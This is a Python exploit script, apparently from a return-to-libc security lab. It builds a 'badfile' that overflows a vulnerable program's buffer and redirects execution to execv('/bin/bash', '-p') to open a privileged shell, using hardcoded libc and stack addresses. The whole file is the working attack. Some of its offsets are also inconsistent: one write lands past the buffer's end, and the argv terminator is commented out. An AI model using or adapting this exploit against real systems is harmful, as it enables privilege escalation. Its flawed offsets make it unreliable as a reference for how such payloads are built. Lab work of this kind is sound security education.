#!/usr/bin/env python3
import sys
# Fill content with non-zero values
content = bytearray(0xaa for i in range(400))
Y = 64 
execv_addr = 0xf7e90420  # The address of execv()
content[Y:Y+4] = (execv_addr).to_bytes(4,byteorder='little')
Z = 68 
exit_addr = 0xf7dfbec0 # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

# Corrected address for /bin/bash (subtract 7 to fix the offset)
correct_sh_addr = 0xffffd426 - 7  # Adjust based on your env string start
content[900:903] = (0).to_bytes(4,byteorder='little')

# Place the argv array after the overflow positions (start at 84)
array_start = 84
content[array_start:array_start+4] = (correct_sh_addr).to_bytes(4,byteorder='little')  # argv[0]: /bin/bash ptr
content[array_start+4:array_start+8] = (0xffffd62d).to_bytes(4,byteorder='little')  # argv[1]: -p ptr
#content[array_start+8:array_start+12] = (0xffffd134).to_bytes(4,byteorder='little')  # argv[2]: NULL

# Use the printed buffer[] address from the program output
buffer_addr = 0xffffcd4c  # From your provided output; rerun ./retlib to confirm and update this

CC = 72
content[CC:CC+4] = (correct_sh_addr).to_bytes(4,byteorder='little')  # pathname: /bin/bash ptr
DD = 76 
argv_ptr = buffer_addr + array_start
content[DD:DD+4] = (argv_ptr).to_bytes(4,byteorder='little')  # argv array ptr

# No need for anything at 80 or 84 since execv() takes only 2 args and uses current env

with open("badfile", "wb") as f:
  f.write(content)
